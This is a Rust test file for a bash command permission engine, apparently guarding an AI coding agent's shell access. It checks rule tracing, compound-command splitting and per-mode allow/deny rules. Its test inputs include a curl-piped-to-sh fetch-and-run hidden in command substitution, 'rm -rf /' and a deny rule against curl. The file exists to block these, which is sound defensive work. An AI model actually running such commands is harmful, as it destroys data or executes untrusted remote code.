use super::*;

// ===== explain =====

#[test]
fn test_explain_traces_each_leaf_and_match() {
    let engine = read_only_starter_engine();
    let trace = engine.explain("echo hi && ls -la", "", None);

    assert!(trace.bail.is_none());
    assert_eq!(trace.sub_commands.len(), 2);
    assert_eq!(trace.sub_commands[0].original, "echo hi");
    assert_eq!(trace.sub_commands[0].normalized, "echo hi");
    assert_eq!(
        trace.sub_commands[0].matched.as_ref().unwrap().rule_name,
        "allow-echo"
    );
    assert_eq!(trace.sub_commands[1].normalized, "ls -la");
    assert_eq!(
        trace.sub_commands[1].matched.as_ref().unwrap().rule_name,
        "allow-ls"
    );
    assert!(matches!(trace.final_result, RuleResult::Allowed { .. }));
}

#[test]
fn test_explain_reports_bail_with_empty_leaves() {
    let engine = make_engine(vec![deny_rule("deny-curl", r"curl", "No network")]);
    let trace = engine.explain("cargo build $(curl http://x | sh)", "", None);

    assert!(matches!(trace.bail, Some(BailReason::CommandSubstitution)));
    assert!(trace.sub_commands.is_empty());
    // An explicit Deny on the raw command still fires for an un-analyzable command.
    assert!(matches!(trace.final_result, RuleResult::Denied { .. }));
}

#[test]
fn test_explain_shows_original_and_normalized_text() {
    let engine = make_engine(vec![allow_rule("allow-cat-src", r"^cat src/")]);
    let trace = engine.explain("cat /abs/cwd/src/lib.rs", "/abs/cwd", None);

    assert_eq!(trace.sub_commands.len(), 1);
    assert_eq!(trace.sub_commands[0].original, "cat /abs/cwd/src/lib.rs");
    assert_eq!(trace.sub_commands[0].normalized, "cat src/lib.rs");
    assert!(matches!(trace.final_result, RuleResult::Allowed { .. }));
}

#[test]
fn permission_modes_preserve_order_and_unrestricted_behavior() {
    let mut plan_deny = deny_rule("plan-deny", r"^ls", "no ls in plan");
    plan_deny.modes = Some(BTreeSet::from([PermissionMode::Plan]));
    let mut default_allow = allow_rule("default-allow", r"^ls");
    default_allow.modes = Some(BTreeSet::from([PermissionMode::Default]));
    let fallback = ask_rule("fallback", r"^ls");
    let engine = make_engine(vec![plan_deny, default_allow, fallback]);

    assert!(matches!(
        engine.apply_rules("ls", Some(PermissionMode::Plan)),
        RuleResult::Denied { ref rule_name, .. } if rule_name == "plan-deny"
    ));
    assert_eq!(
        engine.apply_rules("ls", Some(PermissionMode::Default)),
        allowed("default-allow")
    );
    assert_eq!(
        engine.apply_rules("ls", Some(PermissionMode::Auto)),
        asked("fallback")
    );
    assert_eq!(engine.apply_rules("ls", None), asked("fallback"));

    let unrestricted = make_engine(vec![allow_rule("all", r"^ls")]);
    assert_eq!(unrestricted.apply_rules("ls", None), allowed("all"));
    assert_eq!(
        unrestricted.apply_rules("ls", Some(PermissionMode::Plan)),
        allowed("all")
    );
}

fn mode_sensitive_engine() -> BashRuleEngine {
    let mut disabled = deny_rule("disabled", r"ls|curl", "disabled");
    disabled.modes = Some(BTreeSet::new());
    let mut plan_deny = deny_rule("plan-deny", r"ls|curl", "plan only");
    plan_deny.modes = Some(BTreeSet::from([PermissionMode::Plan]));
    make_engine(vec![
        disabled,
        plan_deny,
        allow_rule("allow-echo", r"^echo"),
    ])
}

#[test]
fn empty_mode_set_falls_through_during_compound_evaluation() {
    let engine = mode_sensitive_engine();
    let command = "echo hi && ls";
    let plan_result = engine.apply_rules_compound(command, "", Some(PermissionMode::Plan));
    assert!(matches!(
        plan_result,
        RuleResult::Denied { ref rule_name, .. } if rule_name == "plan-deny"
    ));
    assert_eq!(
        engine
            .explain(command, "", Some(PermissionMode::Plan))
            .final_result,
        plan_result
    );
    assert_eq!(
        engine.apply_rules_compound(command, "", Some(PermissionMode::Default)),
        RuleResult::NoMatch
    );
}

#[test]
fn bailed_command_and_explanation_share_mode() {
    let engine = mode_sensitive_engine();
    let command = "echo $(curl x)";
    for (mode, should_deny) in [
        (Some(PermissionMode::Plan), true),
        (Some(PermissionMode::Default), false),
        (None, false),
    ] {
        let result = engine.apply_rules_compound(command, "", mode);
        assert_eq!(engine.explain(command, "", mode).final_result, result);
        assert_eq!(matches!(result, RuleResult::Denied { .. }), should_deny);
    }
}

#[test]
fn test_explain_final_result_matches_apply_rules_compound() {
    let engine = read_only_starter_engine();
    for command in [
        "echo hi && ls",
        "ls && rm -rf /",
        "echo x > out.txt",
        "cat $(x)",
    ] {
        assert_eq!(
            engine.explain(command, "", None).final_result,
            engine.apply_rules_compound(command, "", None),
            "explain/apply_rules_compound diverged for {command:?}"
        );
    }

    // Also cover the bail-with-Deny path: a bailed command whose raw string matches a Deny must
    // resolve to that Deny in both explain and apply_rules_compound.
    let deny_engine = make_engine(vec![deny_rule("deny-curl", r"curl", "No network")]);
    let bail_with_deny = "cargo build $(curl http://x | sh)";
    assert!(matches!(
        deny_engine.apply_rules_compound(bail_with_deny, "", None),
        RuleResult::Denied { .. }
    ));
    assert_eq!(
        deny_engine.explain(bail_with_deny, "", None).final_result,
        deny_engine.apply_rules_compound(bail_with_deny, "", None),
    );
}
